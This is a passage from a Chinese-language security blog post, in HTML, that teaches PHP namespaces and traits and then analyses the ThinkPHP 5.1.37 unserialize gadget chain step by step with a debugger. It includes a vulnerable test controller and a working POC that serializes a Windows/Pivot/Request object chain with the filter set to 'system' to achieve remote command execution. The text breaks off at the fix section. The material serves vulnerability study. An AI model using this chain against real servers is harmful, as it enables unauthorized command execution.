class="string">&quot;aaaaaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">B</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">npm</span>\<span class="title">A</span>\<span class="title">a</span> <span class="keyword">as</span> <span class="title">xixi</span>;</span><br><span class="line"><span class="comment">//就是这里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xixi</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155130647.png" alt="image-20240117155130647"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>这里直接复制boo的了  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Json&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">30</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i got smoke \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am son \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$son</span>=<span class="keyword">new</span> <span class="title function_ invoke__">son</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$son</span>-&gt;hobby;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155352348.png" alt="image-20240117155352348"></p><p>其实和java差不多  所以就不多讲了</p><h2 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h2><p>trait修饰符使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">haha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nihao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">haha</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaa\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">nihao</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155837506.png" alt="image-20240117155837506"></p><p>就是说使用trait修饰类以后  我们可以使用use来在类里直接调用他  这样就可以进行类的复用了</p><p>这里讲一下这个 <code>trait</code>的特性  就是他这个只use的话  他里面的方法也是可以被调用到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了toString&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117162158302.png" alt="image-20240117162158302"></p><p>这是个简单的例子</p><p><strong>(这个特性的话在外面接下来讲的这个thinkphp的反序列化链子会用)</strong></p><h1 id="Thinkphp-5-1-37"><a href="#Thinkphp-5-1-37" class="headerlink" title="Thinkphp-5.1.37"></a>Thinkphp-5.1.37</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/top-think/framework/releases/tag/v5.1.37">https://github.com/top-think/framework/releases/tag/v5.1.37</a></p><p><a href="https://github.com/top-think/framework/tree/5.1">https://github.com/top-think/framework/tree/5.1</a></p><p>php7.3.4+xdebuger+thinkphp-5.1.37+phpstorm</p><p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//    public function index()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public function hello($name = &#x27;ThinkPHP5&#x27;)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        return &#x27;hello,&#x27; . $name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117163852265.png" alt="image-20240117163852265"></p><p>然后运行启动的样子是这样的话就成功了</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;boogipop&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;boogipop&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;boogipop&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64生成后直接传入</p><p><img src="../images/image-20240117164143176.png" alt="image-20240117164143176"></p><p>这里简单讲讲这个poc为啥是这样写的   namespace必须是得和源码一样的  然后在定义类的时候  使用的也必须是得和源码一样的  但是在给参数赋值的时候  我们可以<code>__construct()</code>来进行定义   因为这个参数是不进行反序列化的</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="../images/image-20240117170110061.png" alt="image-20240117170110061"></p><p>在这个地方下个断点  然后开始分析就完事了</p><p><img src="../images/image-20240117171019123.png" alt="image-20240117171019123"></p><p>入口点是这个windows类的__destruct方法  我们接着跟进这个removeFiles方法</p><p><img src="../images/image-20240117171253674.png" alt="image-20240117171253674"></p><p>filename是我们在poc中传入的值  就是<code>think\model\Pivot</code>这个类  然后因为file_exists  那么就会调用到toString方法</p><p><img src="../images/image-20240117171516785.png" alt="image-20240117171516785"></p><p>这里的话就会进入到toString方法中  但是为什么是进入到Conversion这个类的toString方法中？？？</p><p>其实这里的原因就是刚刚在上面讲trait的时候讲到的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Model */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autoWriteTimestamp</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 架构函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array|object  $data 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Model         $parent 上级模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string        $table 中间数据表名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span> = [], Model <span class="variable">$parent</span> = <span class="literal">null</span>, <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$table</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们回到think\model\Pivot  这个类中  我们发现这个类中是没有<strong>toString方法的  但是这个类是继承于Model这个类  然而在pivot这个类中没有找到`</strong>toString`方法的时候  就会到父类中去寻找</p><p><img src="../images/image-20240117171953168.png" alt="image-20240117171953168"></p><p>然而父类中也是没有这个方法的   但是这个父类使用use调用了Conversion这个用trait修饰的类</p><p><img src="../images/image-20240117172105733.png" alt="image-20240117172105733"></p><p>所以就会去到这个类中寻找  </p><p><img src="../images/image-20240117172139099.png" alt="image-20240117172139099"></p><p>然后这样就会调用到了  (这里就和我们上面讲的trait修饰符的特殊之处对应上了)</p><p>这里借用boo师傅的一张图</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459350948-dbb6cd39-8803-470a-b65d-3b9449673ba8.png#averageHue=%23fbfbfb&amp;clientId=u0e157718-5316-4&amp;from=paste&amp;height=324&amp;id=u2c18bb5b&amp;name=image.png&amp;originHeight=405&amp;originWidth=1118&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=35689&amp;status=done&amp;style=none&amp;taskId=u5d659110-d16c-49cf-90dc-c4a3ac0f2f2&amp;title=&amp;width=894.4" alt="image.png"></p><p><img src="../images/image-20240118100623108.png" alt="image-20240118100623108"></p><p>跟着进入这个toJson方法  然后接着跟进这个toArray方法</p><p><img src="../images/image-20240118100705471.png" alt="image-20240118100705471"></p><p>跟进toArray方法  </p><p><img src="../images/image-20240118100813573.png" alt="image-20240118100813573"></p><p>重点主要是toArray方法中的这三个方法  我们挨个跟进</p><p><img src="../images/image-20240118100951136.png" alt="image-20240118100951136"></p><p>在poc中 我们设置了这个key -value值 </p><p><img src="../images/image-20240118101056831.png" alt="image-20240118101056831"></p><p>所以这里的值就是boogipop的key值  因为这里key不为空  所以直接返回空</p><p><img src="../images/image-20240118101211331.png" alt="image-20240118101211331"></p><p>因为我们返回的key值为空   所以能进入if判断  所以进入到了这个getAttr的方法中</p><p><img src="../images/image-20240118101306812.png" alt="image-20240118101306812"></p><p>接着跟进这个getData方法中  看看里面是获取了什么东西</p><p><img src="../images/image-20240118101602279.png" alt="image-20240118101602279"></p><p>因为我们的参数名是boogipop 那么第一个if不满足条件  于是跳到了第二个if中  直接返回值</p><p><img src="../images/image-20240118101704892.png" alt="image-20240118101704892"></p><p>这里返回的Request对象  就是在我们刚刚poc中设置的对象</p><p><img src="../images/image-20240118101738321.png" alt="image-20240118101738321"></p><p>这就是在我们poc中设置的键值对了</p><p><img src="../images/image-20240118101914241.png" alt="image-20240118101914241"></p><p>因为$relation为我们刚刚获取到的request对象  因为request对象中没有visible这个方法  那么就会调用到__call魔术方法  </p><p><img src="../images/image-20240118102113131.png" alt="image-20240118102113131"></p><p><img src="../images/image-20240118102214428.png" alt="image-20240118102214428"></p><p><img src="../images/image-20240118102229712.png" alt="image-20240118102229712"></p><p>然后传进来的参数就变成了  我们刚刚设置的那个数组的键值对了</p><p>首先使用<code>array_shift</code>往之前的<code>[calc,calc.exe]</code>数组插入<code>$this</code>也就是<code>Request</code>对象，之后调用<code>call_user_func_array</code>方法，其中<code>$this-&gt;hook[$method]</code>就是<code>$this-&gt;hook[&#39;visible&#39;]</code>，在POC中为<code>isAjax</code>方法，跟进该方法：</p><p><img src="../images/image-20240118102611000.png" alt="image-20240118102611000"></p><p>然后我们接着跟进这个param方法</p><p><img src="../images/image-20240118102706685.png" alt="image-20240118102706685"></p><p>然后我们接着跟进这个input方法  这个方法的就是获取我们url输入的键值对</p><p><img src="../images/image-20240118102845013.png" alt="image-20240118102845013"></p><p>然后跟进这个getData方法  看看其能获取到什么东西</p><p><img src="../images/image-20240118102953982.png" alt="image-20240118102953982"></p><p>这个函数就是遍历我们传入的键值对  然后返回该结果  这里就将我们传入的whoami给获取到了</p><p><img src="../images/image-20240118103054878.png" alt="image-20240118103054878"></p><p>跟进这个getFilter方法  因为我们在poc初始化的时候给filter也赋值了</p><p><img src="../images/image-20240118103149054.png" alt="image-20240118103149054"></p><p>这里用个三目运算符来进行判断  如果filter传入为空的话就用我们的初始化值</p><p><img src="../images/image-20240118103253845.png" alt="image-20240118103253845"></p><p>在poc中的话也指定了这个filter的值 </p><p><img src="../images/image-20240118103350265.png" alt="image-20240118103350265"></p><p>然后将这个空值传入到这个filter数组中去  不过没有影响  后面会有函数将null给除去</p><p><img src="../images/image-20240118103509930.png" alt="image-20240118103509930"></p><p>然后我们接着跟进这个filterValue方法 </p><p><img src="../images/image-20240118103542067.png" alt="image-20240118103542067"></p><p>跟进之后  我们返回了这里会使用array_pop方法来将我们的filter数组的最后一个数给除去</p><p><img src="../images/image-20240118103644583.png" alt="image-20240118103644583"></p><p>然后最后我的call_user_func就会执行我们构造的恶意命令了  然后成功完成RCE</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png#averageHue=%232c313d&amp;clientId=u0e157718-5316-4&amp;from=paste&amp;id=u705a915f&amp;name=image.png&amp;originHeight=886&amp;originWidth=1421&amp;originalType=url&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=333657&amp;status=done&amp;style=none&amp;taskId=udbeab041-29e1-4e3e-97e2-5d709d1b8a7&amp;title=" alt="image.png"></p><p>贴一张链子的完全图</p><h2 id="修复方法"><a href="#修复方法" 